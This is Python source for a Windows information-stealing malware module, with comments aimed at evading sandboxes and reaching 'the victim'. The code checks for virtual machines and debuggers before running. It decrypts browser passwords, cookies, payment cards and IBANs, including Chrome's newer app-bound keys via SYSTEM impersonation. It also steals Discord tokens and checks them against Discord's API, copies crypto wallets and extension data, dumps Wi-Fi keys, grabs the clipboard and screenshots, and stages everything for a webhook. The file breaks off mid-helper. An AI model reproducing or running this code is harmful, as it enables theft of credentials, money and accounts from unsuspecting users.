"""Self-contained harvest module. Executed from memory by the boot stub.

Zero third-party dependencies: AES-256-GCM through BCrypt, screen capture
through GDI, everything else stdlib. Phase 1 beacons in under 3 seconds;
phase 2 ships the archive.
"""

import base64
import ctypes
import getpass
import hashlib
import json
import mimetypes
import os
import platform
import re
import shutil
import socket
import sqlite3
import struct
import tempfile
import threading
import time
import urllib.error
import urllib.request
import uuid
import zipfile
from pathlib import Path

WEBHOOK = "__WEBHOOK__"
APP_ID = "__APP_ID__"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

_LOCAL = Path(os.environ.get("LOCALAPPDATA") or ".")
_ROAM = Path(os.environ.get("APPDATA") or ".")


# --------------------------------------------------------------------------
# guard - ctypes only, no subprocess, sub-millisecond
# --------------------------------------------------------------------------

_VM_MAC = ("00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27",
           "0a:00:27", "00:15:5d", "00:03:ff", "52:54:00", "00:16:3e",
           "00:1c:42")
_HOST_MARK = ("sandbox", "malware", "virus", "cuckoo", "analysis", "honeypot",
              "vbox", "vmware", "virtual")


class _MEM(ctypes.Structure):
    _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]


def _ram_gb():
    m = _MEM()
    m.dwLength = ctypes.sizeof(_MEM)
    try:
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m)):
            return round(m.ullTotalPhys / 1073741824, 1)
    except OSError:
        pass
    return 0.0


def _disk_gb():
    total = ctypes.c_ulonglong()
    try:
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
            ctypes.c_wchar_p(os.environ.get("SystemDrive", "C:") + "\\"),
            None, ctypes.byref(total), None)
        return round(total.value / 1073741824, 1)
    except OSError:
        return 0.0


def _debugged():
    try:
        return bool(ctypes.windll.kernel32.IsDebuggerPresent())
    except OSError:
        return False


def _rdp():
    try:
        return bool(ctypes.windll.user32.GetSystemMetrics(0x1000))
    except OSError:
        return False


def _hostile():
    """True when the host looks like a lab. ctypes + stdlib only.

    An RDP session is not a lab: most test boxes, and a lot of real desktops,
    are reached over RDP. The check that used to sit here stood the grabber
    down on every remote session, which read as "the payload is dead".
    OXDEBUG (any value) is the manual override.
    """
    if _DEBUG:
        return False
    node = uuid.getnode()
    mac = ":".join(f"{(node >> s) & 255:02x}" for s in range(40, -1, -8))
    if mac.startswith(_VM_MAC):
        return True
    host = (os.environ.get("COMPUTERNAME") or "").lower()
    if any(mark in host for mark in _HOST_MARK):
        return True
    if _debugged():
        return True
    if _ram_gb() and _ram_gb() < 2.0:
        return True
    if _disk_gb() and _disk_gb() < 20.0:
        return True
    return False


def _lock_name():
    """Mutex name scoped to this artifact's label.

    One global name is wrong: a long-lived holder (an injected app.py running
    the harvest in a daemon thread for the whole session) would silently block
    every other bound file for the rest of the boot. Scoped per label, two
    different bound files each get their own single drop.
    """
    label = "".join(ch if (ch.isalnum() or ch == "-") else "-"
                    for ch in str(APP_ID))[:32].strip("-")
    return "Global\\hv_boot_lock_" + (label or "default")


def _once():
    """Named mutex - one drop per boot session per artifact, no disk artefact.

    The handle is kept in module state for the life of the process: closing it
    early would drop the name and let a second run through in the same boot.
    OXDEBUG bypasses the gate so a manual test is never a silent no-op.
    """
    global _LOCK
    if _DEBUG:
        return True
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(
            None, False, _lock_name())
        if not handle:
            return True          # no privilege for Global\ - do not block
        _LOCK = handle
        return ctypes.windll.kernel32.GetLastError() != 183
    except OSError:
        return True


# --------------------------------------------------------------------------
# crypto - DPAPI + AES-256-GCM via BCrypt, no pycryptodome on the victim
# --------------------------------------------------------------------------

class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]


def _dpapi(data):
    if not data:
        return b""
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    inb = _BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out = _BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(inb), None, None, None, None, 0, ctypes.byref(out))
    if not ok:
        raise OSError(f"dpapi {ctypes.get_last_error()}")
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(ctypes.cast(out.pbData, ctypes.c_void_p))


class _AUTH(ctypes.Structure):
    _fields_ = [
        ("cbSize", ctypes.c_ulong), ("dwInfoVersion", ctypes.c_ulong),
        ("pbNonce", ctypes.POINTER(ctypes.c_ubyte)), ("cbNonce", ctypes.c_ulong),
        ("pbAuthData", ctypes.POINTER(ctypes.c_ubyte)), ("cbAuthData", ctypes.c_ulong),
        ("pbTag", ctypes.POINTER(ctypes.c_ubyte)), ("cbTag", ctypes.c_ulong),
        ("pbMacContext", ctypes.POINTER(ctypes.c_ubyte)), ("cbMacContext", ctypes.c_ulong),
        ("cbAAD", ctypes.c_ulong), ("cbData", ctypes.c_ulonglong),
        ("dwFlags", ctypes.c_ulong),
    ]


def _gcm(key, blob):
    """blob = nonce(12) || ciphertext || tag(16) -> plaintext bytes."""
    if len(blob) < 29 or not key:
        return b""
    nonce, tag, ct = blob[:12], blob[-16:], blob[12:-16]
    bcrypt = ctypes.WinDLL("bcrypt")
    h_alg, h_key = ctypes.c_void_p(), ctypes.c_void_p()
    try:
        if bcrypt.BCryptOpenAlgorithmProvider(
                ctypes.byref(h_alg), ctypes.c_wchar_p("AES"), None, 0) != 0:
            return b""
        mode = ctypes.create_unicode_buffer("ChainingModeGCM")
        bcrypt.BCryptSetProperty(
            h_alg, ctypes.c_wchar_p("ChainingMode"),
            ctypes.cast(mode, ctypes.c_void_p), ctypes.sizeof(mode), 0)
        if bcrypt.BCryptGenerateSymmetricKey(
                h_alg, ctypes.byref(h_key), None, 0, key, len(key), 0) != 0:
            return b""
        nb = (ctypes.c_ubyte * 12).from_buffer_copy(nonce)
        tb = (ctypes.c_ubyte * 16).from_buffer_copy(tag)
        cb = (ctypes.c_ubyte * len(ct)).from_buffer_copy(ct)
        out = (ctypes.c_ubyte * len(ct))()
        info = _AUTH()
        info.cbSize = ctypes.sizeof(_AUTH)
        info.dwInfoVersion = 1
        info.pbNonce = ctypes.cast(nb, ctypes.POINTER(ctypes.c_ubyte))
        info.cbNonce = 12
        info.pbTag = ctypes.cast(tb, ctypes.POINTER(ctypes.c_ubyte))
        info.cbTag = 16
        info.cbData = len(ct)
        written = ctypes.c_ulong(0)
        rc = bcrypt.BCryptDecrypt(
            h_key, ctypes.cast(cb, ctypes.c_void_p), len(ct),
            ctypes.byref(info), None, 0,
            ctypes.cast(out, ctypes.c_void_p), len(ct),
            ctypes.byref(written), 0)
        return bytes(out[:written.value]) if rc == 0 else b""
    finally:
        if h_key.value:
            bcrypt.BCryptDestroyKey(h_key)
        if h_alg.value:
            bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)


def _chromium_key(local_state):
    try:
        state = json.loads(Path(local_state).read_text("utf-8", errors="ignore"))
    except (OSError, ValueError):
        return None
    enc = (state.get("os_crypt") or {}).get("encrypted_key")
    if not enc:
        return None
    raw = base64.b64decode(enc)
    if raw[:5] == b"DPAPI":
        raw = raw[5:]
    try:
        key = _dpapi(raw)
    except OSError:
        return None
    return key if len(key) == 32 else None


def _app_bound_key(local_state):
    """Chrome 127+ app-bound key. Only resolves when running as SYSTEM."""
    try:
        state = json.loads(Path(local_state).read_text("utf-8", errors="ignore"))
    except (OSError, ValueError):
        return None
    enc = (state.get("os_crypt") or {}).get("app_bound_encrypted_key")
    if not enc:
        return None
    raw = base64.b64decode(enc)
    if raw[:4] == b"APPB":
        raw = raw[4:]
    try:
        mid = _dpapi(raw)
        key = _dpapi(mid)
    except OSError:
        return None
    return key if len(key) == 32 else None


def _decrypt(blob, key, abe=None):
    if not blob:
        return ""
    if isinstance(blob, str):
        blob = blob.encode("utf-8", "ignore")
    if blob[:3] in (b"v10", b"v11"):
        return _gcm(key, blob[3:]).decode("utf-8", "ignore")
    if blob[:3] == b"v20":
        return _gcm(abe, blob[3:]).decode("utf-8", "ignore") if abe else ""
    try:
        return _dpapi(blob).decode("utf-8", "ignore")
    except OSError:
        return ""


# --------------------------------------------------------------------------
# zip staging
# --------------------------------------------------------------------------

_STAGE = None


def _stage():
    global _STAGE
    if _STAGE is None:
        _STAGE = Path(tempfile.mkdtemp(prefix="."))
    return _STAGE


def _db(path):
    """Read-only open with a probe query; byte-copy fallback when locked."""
    path = Path(path)
    if not path.is_file():
        return None
    conn = None
    try:
        conn = sqlite3.connect(f"file:{path.as_posix()}?mode=ro&immutable=1",
                               uri=True, timeout=2)
        conn.text_factory = bytes
        conn.execute("SELECT count(*) FROM sqlite_master").fetchone()
        return conn
    except (sqlite3.Error, OSError):
        if conn is not None:
            try:
                conn.close()
            except sqlite3.Error:
                pass
    try:
        tmp = _stage() / f"c{uuid.uuid4().hex[:8]}_{path.name}"
        tmp.write_bytes(path.read_bytes())
        conn = sqlite3.connect(str(tmp), timeout=2)
        conn.text_factory = bytes
        return conn
    except (OSError, sqlite3.Error):
        return None


def _q(conn, sql, limit=4000):
    if conn is None:
        return []
    try:
        return conn.execute(sql).fetchmany(limit)
    except sqlite3.Error:
        return []
    finally:
        conn.close()


def _s(v):
    if isinstance(v, bytes):
        return v.decode("utf-8", "ignore")
    return "" if v is None else str(v)


def _lines(path, rows):
    """Write text rows deduped and sorted, best first.

    Every text dump in the archive is an index rather than a stream: same
    content, deterministic order, duplicates collapsed. The archive is read
    by eye at the other end, so order is part of the deliverable.
    """
    seen, out = set(), []
    for row in rows:
        row = _s(row).rstrip("\r\n")
        if row and row not in seen:
            seen.add(row)
            out.append(row)
    out.sort(key=str.casefold)
    path.parent.mkdir(parents=True, exist_ok=True)
    try:
        path.write_text("\n".join(out), encoding="utf-8")
    except OSError:
        pass
    return out


def _mm(value):
    """Expiry month as two digits; anything unparseable comes back empty."""
    try:
        return f"{int(value):02d}"
    except (TypeError, ValueError):
        return ""


# Rows collected across every browser/profile, written once at the end as a
# single flat file. Same tuples the per-profile files use.
_ALL_PW = []
_ALL_CARDS = []
_ACCOUNTS = {}


# --------------------------------------------------------------------------
# phase 1 - fingerprint + discord tokens, one POST, ~1.5 s
# --------------------------------------------------------------------------

def _sysinfo():
    node = uuid.getnode()
    return {
        "app_id": APP_ID,
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "domain": os.environ.get("USERDOMAIN", ""),
        "os": platform.platform(),
        "build": platform.version(),
        "arch": platform.machine(),
        "cpu": platform.processor(),
        "cpus": os.cpu_count(),
        "ram_gb": _ram_gb(),
        "disk_gb": _disk_gb(),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "mac": ":".join(f"{(node >> s) & 255:02x}" for s in range(40, -1, -8)),
        "admin": bool(ctypes.windll.shell32.IsUserAnAdmin()),
        "pid": os.getpid(),
        "frozen": bool(getattr(__import__("sys"), "frozen", False)),
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }


_DISCORD = {
    "Discord": _ROAM / "discord",
    "DiscordPTB": _ROAM / "discordptb",
    "DiscordCanary": _ROAM / "discordcanary",
    "Lightcord": _ROAM / "Lightcord",
}
_TOKEN_PLAIN = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}")
_TOKEN_SEALED = re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{20,})")


def _discord_tokens():
    found, seen = [], set()
    for app, root in _DISCORD.items():
        state = root / "Local State"
        key = _chromium_key(state) if state.is_file() else None
        ldb = root / "Local Storage" / "leveldb"
        if not ldb.is_dir():
            continue
        for pattern in ("*.ldb", "*.log"):
            for f in ldb.glob(pattern):
                try:
                    blob = f.read_bytes().decode("utf-8", "ignore")
                except OSError:
                    continue
                for tok in _TOKEN_PLAIN.findall(blob):
                    if tok not in seen:
                        seen.add(tok)
                        found.append({"app": app, "token": tok})
                for b64 in _TOKEN_SEALED.findall(blob):
                    if not key:
                        continue
                    try:
                        tok = _gcm(key, base64.b64decode(b64)[3:]).decode("utf-8", "ignore")
                    except ValueError:
                        continue
                    if tok and tok not in seen:
                        seen.add(tok)
                        found.append({"app": app, "token": tok})
    for item in found[:20]:
        try:
            req = urllib.request.Request(
                "https://discord.com/api/v10/users/@me",
                headers={"Authorization": item["token"], "User-Agent": UA})
            with urllib.request.urlopen(req, timeout=5) as resp:
                p = json.loads(resp.read().decode("utf-8", "ignore"))
            item.update(user=p.get("username"), uid=p.get("id"),
                        email=p.get("email"), phone=p.get("phone"),
                        nitro=p.get("premium_type"), mfa=p.get("mfa_enabled"),
                        valid=True)
        except Exception:
            item["valid"] = False
    _stage().joinpath("tokens.json").write_text(
        json.dumps(found, indent=2), encoding="utf-8")
    return found


def phase1():
    data = _sysinfo()
    data["discord"] = _discord_tokens()
    return data


# --------------------------------------------------------------------------
# phase 2 - browsers, wallets, wifi, screen, archive
# --------------------------------------------------------------------------

_BROWSERS = {
    "Chrome": _LOCAL / "Google" / "Chrome" / "User Data",
    "ChromeBeta": _LOCAL / "Google" / "Chrome Beta" / "User Data",
    "Edge": _LOCAL / "Microsoft" / "Edge" / "User Data",
    "Brave": _LOCAL / "BraveSoftware" / "Brave-Browser" / "User Data",
    "Vivaldi": _LOCAL / "Vivaldi" / "User Data",
    "Yandex": _LOCAL / "Yandex" / "YandexBrowser" / "User Data",
    "Opera": _ROAM / "Opera Software" / "Opera Stable",
    "OperaGX": _ROAM / "Opera Software" / "Opera GX Stable",
}

_WALLETS = {
    "Exodus": _ROAM / "Exodus" / "exodus.wallet",
    "Electrum": _ROAM / "Electrum" / "wallets",
    "Atomic": _ROAM / "atomic" / "Local Storage" / "leveldb",
    "Coinomi": _ROAM / "Coinomi" / "Coinomi" / "wallets",
    "Guarda": _ROAM / "Guarda" / "Local Storage" / "leveldb",
    "Binance": _ROAM / "Binance" / "Local Storage" / "leveldb",
    "Wasabi": _ROAM / "WalletWasabi" / "Client",
    "Monero": _ROAM / "Monero" / "wallets",
    "LedgerLive": _ROAM / "Ledger Live",
    "Trezor": _ROAM / "@trezor" / "suite-desktop",
    "Daedalus": _ROAM / "Daedalus" / "wallets",
    "Coinbase": _ROAM / "Coinbase" / "Local Storage" / "leveldb",
    "Trust": _ROAM / "Trust Wallet" / "Local Storage" / "leveldb",
    "Phantom": _ROAM / "Phantom",
    "Solflare": _ROAM / "Solflare",
    "Ethereum": _ROAM / "Ethereum" / "keystore",
}

_EXT = {
    "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
    "TronLink": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
    "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
    "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
}


def _profiles(root):
    if not root.is_dir():
        return []
    if (root / "Default").is_dir():
        return [root / "Default", *sorted(root.glob("Profile *"))]
    if (root / "Login Data").exists() or (root / "Cookies").exists():
        return [root]
    return []


def _chrome_time(v):
    if not v:
        return ""
    try:
        import datetime
        return (datetime.datetime(1601, 1, 1) +
                datetime.timedelta(microseconds=int(v))).strftime("%Y-%m-%d %H:%M")
    except (OverflowError, ValueError, TypeError):
        return ""


def _one_profile(browser, profile, out, abe=None):
    out.mkdir(parents=True, exist_ok=True)
    state = profile.parent / "Local State"
    if not state.is_file():
        state = profile / "Local State"
    key = _chromium_key(state) if state.is_file() else None
    abe = abe or (_app_bound_key(state) if state.is_file() else None)
    mode = "app-bound" if abe else ("dpapi" if key else "none")
    stats = {"browser": browser, "profile": profile.name, "key": mode,
             "logins": 0, "cookies": 0, "cards": 0, "autofill": 0,
             "history": 0, "sealed": 0}

    lines, pw_ok, sealed_logins = [], 0, 0
    for origin, user, pwd in _q(_db(profile / "Login Data"),
                                "SELECT origin_url, username_value, password_value FROM logins"):
        raw = pwd if isinstance(pwd, bytes) else b""
        pw = _decrypt(raw, key, abe)
        status = "ok"
        if pw:
            pw_ok += 1
        elif raw[:3] == b"v20":
            sealed_logins += 1
            status = "sealed-v20"
        elif raw:
            status = "fail"
        if _s(user) or pw:
            line = f"{_s(origin)}\t{_s(user)}\t{pw}\t{status}"
            lines.append(line)
            _ALL_PW.append([browser, profile.name, _s(origin), _s(user), pw, status])
    stats["logins"] = len(lines)
    stats["pw_ok"] = pw_ok
    stats["sealed_logins"] = sealed_logins
    _lines(out / "logins.txt", lines)
    time.sleep(0.12)

    cdb = profile / "Network" / "Cookies"
    if not cdb.exists():
        cdb = profile / "Cookies"
    lines, sealed = [], 0
    for host, name, plain, enc, path, exp, sec, ho in _q(
            _db(cdb),
            "SELECT host_key, name, value, encrypted_value, path, expires_utc, "
            "is_secure, is_httponly FROM cookies"):
        raw = enc if isinstance(enc, bytes) else b""
        val = _s(plain) or _decrypt(raw, key, abe)
        if val and raw[:3] == b"v20":
            # Chrome binds newer cookies to the host: the plaintext starts with
            # sha256(host_key), 32 raw bytes. Left in place it corrupts the
            # value, so it is checked and stripped.
            body = val.encode("utf-8", "ignore")
            digest = hashlib.sha256(_s(host).encode("utf-8")).digest()
            if len(body) > 32 and body[:32] == digest:
                val = body[32:].decode("utf-8", "ignore")
        if val:
            lines.append(f"{_s(host)}\t{_s(name)}\t{val}\t{_s(path)}\t"
                         f"{_chrome_time(exp)}\t{('S' if sec else '-') + ('H' if ho else '-')}")
        elif raw[:3] == b"v20":
            sealed += 1
    stats["cookies"] = len(lines)
    stats["sealed"] = sealed
    _lines(out / "cookies.txt", lines)
    time.sleep(0.12)

    wd = profile / "Web Data"
    lines = [f"{_s(n)}\t{_s(v)}\t{_s(c)}" for n, v, c in
             _q(_db(wd), "SELECT name, value, count FROM autofill")]
    stats["autofill"] = len(lines)
    _lines(out / "autofill.txt", lines)

    # Cards live in three tables across Chromium versions: credit_cards carries
    # the encrypted number, masked_credit_cards is the newer sync-only form,
    # local_ibans carries bank IBANs. All three are read, and a row whose blob
    # cannot be decrypted here still ships with its metadata plus the raw blob
    # so the SYSTEM pass can finish it offline.
    cards, raw_cards = [], []
    # Column sets differ across Chromium builds: if the full select fails the
    # whole card table would come back empty, so the narrowed selects run as
    # fallbacks before the table is written off.
    rows = _q(_db(wd),
              "SELECT name_on_card, expiration_month, expiration_year, "
              "card_number_encrypted, nickname FROM credit_cards")
    if not rows:
        rows = [r + ("",) for r in _q(
            _db(wd),
            "SELECT name_on_card, expiration_month, expiration_year, "
            "card_number_encrypted FROM credit_cards")]
    if not rows:
        rows = [(r[0], "", "", r[1], "") for r in _q(
            _db(wd), "SELECT name_on_card, card_number FROM credit_cards")]
    for holder, mo, yr, enc, nick in rows:
        raw = enc if isinstance(enc, bytes) else _s(enc).encode("utf-8", "ignore")
        num = _decrypt(raw, key, abe) if raw else ""
        status = "ok" if num else ("sealed-v20" if raw[:3] == b"v20" else "fail")
        expiry = f"{_mm(mo)}/{_s(yr)}" if mo or yr else ""
        cards.append(f"{_s(holder)}\t{num or '-'}\t{expiry}\t{_s(nick)}\t{status}")
        if num:
            stats["cards_ok"] = stats.get("cards_ok", 0) + 1
        if raw:
            raw_cards.append(f"{_s(holder)}\t{expiry}\t{_s(nick)}\t"
                             f"{base64.b64encode(raw).decode()}")
        _ALL_CARDS.append([browser, profile.name, _s(holder), num, expiry,
                           _s(nick), status])
    for holder, network, last4, mo, yr, nick in _q(
            _db(wd),
            "SELECT name_on_card, network, last_four, exp_month, exp_year, "
            "nickname FROM masked_credit_cards"):
        expiry = f"{_mm(mo)}/{_s(yr)}" if mo or yr else ""
        masked = f"****{_s(last4)}" if last4 else "-"
        cards.append(f"{_s(holder)}\t{masked}\t{expiry}\t{_s(nick)}\t"
                     f"masked:{_s(network)}")
        _ALL_CARDS.append([browser, profile.name, _s(holder), masked, expiry,
                           _s(nick), "masked"])
    for iban, nick in _q(_db(wd), "SELECT iban, nickname FROM local_ibans"):
        if _s(iban):
            cards.append(f"IBAN\t{_s(iban)}\t-\t{_s(nick)}\tok")
            _ALL_CARDS.append([browser, profile.name, "IBAN", _s(iban), "",
                               _s(nick), "ok"])
    stats["cards"] = len(cards)
    _lines(out / "cards.txt", cards)
    if raw_cards:
        _lines(out / "cards_raw.txt", raw_cards)
    time.sleep(0.1)

    hist = profile / "History"
    lines = [f"{_chrome_time(v)}\t{_s(u)}\t{_s(t)}" for u, t, v in
             _q(_db(hist), "SELECT url, title, last_visit_time FROM urls "
                           "ORDER BY last_visit_time DESC", 1500)]
    stats["history"] = len(lines)
    (out / "history.txt").write_text("\n".join(lines), encoding="utf-8")

    bm = profile / "Bookmarks"
    if bm.is_file():
        try:
            (out / "Bookmarks.json").write_bytes(bm.read_bytes())
        except OSError:
            pass
    return stats


def _browsers(abe_map=None):
    results = []
    for browser, root in _BROWSERS.items():
        abe = (abe_map or {}).get(browser)
        for profile in _profiles(root):
            try:
                results.append(_one_profile(
                    browser, profile,
                    _stage() / "browsers" / browser / profile.name, abe))
            except Exception as exc:
                results.append({"browser": browser, "profile": profile.name,
                                "error": repr(exc)})
    return results


def _wallets():
    found = []
    root = _stage() / "wallets"
    for name, src in _WALLETS.items():
        try:
            if not src.exists():
                continue
            dst = root / name
            if src.is_dir():
                shutil.copytree(src, dst, dirs_exist_ok=True,
                                ignore=shutil.ignore_patterns("*.log", "Cache", "*.lock"))
            else:
                dst.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(src, dst)
            found.append(name)
        except (OSError, shutil.Error):
            continue

    for browser, base in _BROWSERS.items():
        for profile in _profiles(base):
            for ext, ext_id in _EXT.items():
                src = profile / "Local Extension Settings" / ext_id
                if not src.is_dir():
                    continue
                try:
                    shutil.copytree(src, root / "ext" / browser / profile.name / ext,
                                    dirs_exist_ok=True)
                    found.append(f"{browser}/{profile.name}/{ext}")
                except (OSError, shutil.Error):
                    continue
    return found


def _wifi():
    import subprocess
    flags = 0x08000000
    try:
        out = subprocess.run(["netsh", "wlan", "show", "profiles"],
                             capture_output=True, text=True, timeout=12,
                             creationflags=flags).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    names = [l.split(":", 1)[1].strip() for l in out.splitlines()
             if "All User Profile" in l and ":" in l]
    rows = []
    for name in names[:40]:
        try:
            detail = subprocess.run(
                ["netsh", "wlan", "show", "profile", name, "key=clear"],
                capture_output=True, text=True, timeout=12,
                creationflags=flags).stdout
        except (OSError, subprocess.SubprocessError):
            continue
        key = next((l.split(":", 1)[1].strip() for l in detail.splitlines()
                    if "Key Content" in l and ":" in l), "")
        rows.append({"ssid": name, "password": key})
    return rows


def _clipboard():
    u = ctypes.WinDLL("user32")
    k = ctypes.WinDLL("kernel32")
    u.OpenClipboard.argtypes = [ctypes.c_void_p]
    u.CloseClipboard.argtypes = []
    u.GetClipboardData.restype = ctypes.c_void_p
    u.GetClipboardData.argtypes = [ctypes.c_uint]
    k.GlobalLock.restype = ctypes.c_void_p
    k.GlobalLock.argtypes = [ctypes.c_void_p]
    k.GlobalUnlock.argtypes = [ctypes.c_void_p]

    if not u.OpenClipboard(None):
        return ""
    try:
        handle = u.GetClipboardData(13)
        if not handle:
            return ""
        ptr = k.GlobalLock(handle)
        if not ptr:
            return ""
        try:
            return ctypes.wstring_at(ptr)
        finally:
            k.GlobalUnlock(handle)
    finally:
        u.CloseClipboard()


def _screen(path):
    """GDI capture to BMP. Capped so the archive stays sane."""
    gdi = ctypes.WinDLL("gdi32")
    user = ctypes.WinDLL("user32")
    vp = ctypes.c_void_p

    user.GetDC.restype = vp
    user.GetDC.argtypes = [vp]
    user.ReleaseDC.argtypes = [vp, vp]
    gdi.CreateCompatibleDC.restype = vp
    gdi.CreateCompatibleDC.argtypes = [vp]
    gdi.CreateCompatibleBitmap.restype = vp
    gdi.CreateCompatibleBitmap.argtypes = [vp, ctypes.c_int, ctypes.c_int]
    gdi.SelectObject.restype = vp
    gdi.SelectObject.argtypes = [vp, vp]
    gdi.BitBlt.argtypes = [vp, ctypes.c_int, ctypes.c_int, ctypes.c_int,
                           ctypes.c_int, vp, ctypes.c_int, ctypes.c_int, ctypes.c_ulong]
    gdi.GetDIBits.argtypes = [vp, vp, ctypes.c_uint, ctypes.c_uint,
                              vp, vp, ctypes.c_uint]
    gdi.DeleteObject.argtypes = [vp]
    gdi.DeleteDC.argtypes = [vp]

    w, h = user.GetSystemMetrics(0), user.GetSystemMetrics(1)
    if not w or not h or w * h > 2560 * 1440:
        return False

    hdc = user.GetDC(None)
    if not hdc:
        return False
    mem = gdi.CreateCompatibleDC(hdc)
    bmp = gdi.CreateCompatibleBitmap(hdc, w, h)
    if not mem or not bmp:
        gdi.DeleteDC(mem)
        user.ReleaseDC(None, hdc)
        return False
    old = gdi.SelectObject(mem, bmp)
    gdi.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

    stride = ((w * 3 + 3) // 4) * 4
    size = stride * h
    pixels = (ctypes.c_ubyte * size)()
    bih = struct.pack("<IiiHHIIiiII", 40, w, h, 1, 24, 0, size, 0, 0, 0, 0)
    bih_buf = ctypes.create_string_buffer(bih, len(bih))

    ok = gdi.GetDIBits(mem, bmp, 0, h, ctypes.cast(pixels, vp),
                       ctypes.cast(bih_buf, vp), 0) != 0
    gdi.SelectObject(mem, old)
    gdi.DeleteObject(bmp)
    gdi.DeleteDC(mem)
    user.ReleaseDC(None, hdc)
    if not ok:
        return False

    total = 14 + len(bih) + size
    header = struct.pack("<2sIHHI", b"BM", total, 0, 0, 14 + len(bih))
    try:
        with open(path, "wb") as fh:
            fh.write(header)
            fh.write(bih)
            fh.write(bytes(pixels))
        return True
    except OSError:
        return False


def _public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=4) as r:
            return r.read().decode().strip()
    except Exception:
        return ""


# --------------------------------------------------------------------------
# privilege - app-bound (v20) keys only resolve under SYSTEM
# --------------------------------------------------------------------------

def _is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except OSError:
        return False


def _is_system():
    try:
        buf = ctypes.create_unicode_buffer(257)
        n = ctypes.c_ulong(257)
        if not ctypes.windll.advapi32.GetUserNameW(buf, ctypes.byref(n)):
            return False
        return buf.value.upper() == "SYSTEM"
    except OSError:
        return False


def _console_token():
    """Token of the user sitting at the console. SYSTEM only (SE_TCB)."""
    try:
        k32 = ctypes.WinDLL("kernel32")
        wts = ctypes.WinDLL("wtsapi32")
        wts.WTSQueryUserToken.argtypes = [ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p)]
        sid = k32.WTSGetActiveConsoleSessionId()
        if sid == 0xFFFFFFFF:
            return None
        handle = ctypes.c_void_p()
        if not wts.WTSQueryUserToken(sid, ctypes.byref(handle)):
            return None
        return handle
    except OSError:
        return None


def _app_bound_system(local_state):
    """APPB blob: unwrap as SYSTEM, then unwrap the inner blob as the user."""
    try:
        state = json.loads(Path(local_state).read_text("utf-8", errors="ignore"))
    except (OSError, ValueError):
        return None
    enc = (state.get("os_crypt") or {}).get("app_bound_encrypted_key")
    if not enc:
        return None
    raw = base64.b64decode(enc)
    if raw[:4] == b"APPB":
        raw = raw[4:]
    try:
        mid = _dpapi(raw)
    except OSError:
        return None
    adv = ctypes.WinDLL("advapi32")
    adv.ImpersonateLoggedOnUser.argtypes = [ctypes.c_void_p]
    adv.RevertToSelf.argtypes = []
    token = _console_token()
    if not token:
        return None
    if not adv.ImpersonateLoggedOnUser(token):
        return None
    try:
        key = _dpapi(mid)
    except OSError:
        key = b""
    finally:
        adv.RevertToSelf()
    return key if len(key) == 32 else None


_V20_HELPER = r'''import base64, ctypes, json, os, subprocess, sys, time, uuid


def is_system():
    buf = ctypes.create_unicode_buffer(257)
    n = ctypes.c_ulong(257)
    if not ctypes.windll.advapi32.GetUserNameW(buf, ctypes.byref(n)):
        return False
    return buf.value.upper() == "SYSTEM"


class BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_char))]


def dpapi(data):
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    inb = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(inb), None, None, None, None, 0, ctypes.byref(out)):
        raise OSError("dpapi")
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(ctypes.cast(out.pbData, ctypes.c_void_p))


def unwrap(paths):
    """Outer layer opens inside SYSTEM, inner layer inside the console user."""
    adv = ctypes.WinDLL("advapi32")
    wts = ctypes.WinDLL("wtsapi32")
    k32 = ctypes.WinDLL("kernel32")
    wts.WTSQueryUserToken.argtypes = [ctypes.c_ulong,
                                      ctypes.POINTER(ctypes.c_void_p)]
    adv.ImpersonateLoggedOnUser.argtypes = [ctypes.c_void_p]
    adv.RevertToSelf.argtypes = []
    handle = ctypes.c_void_p()
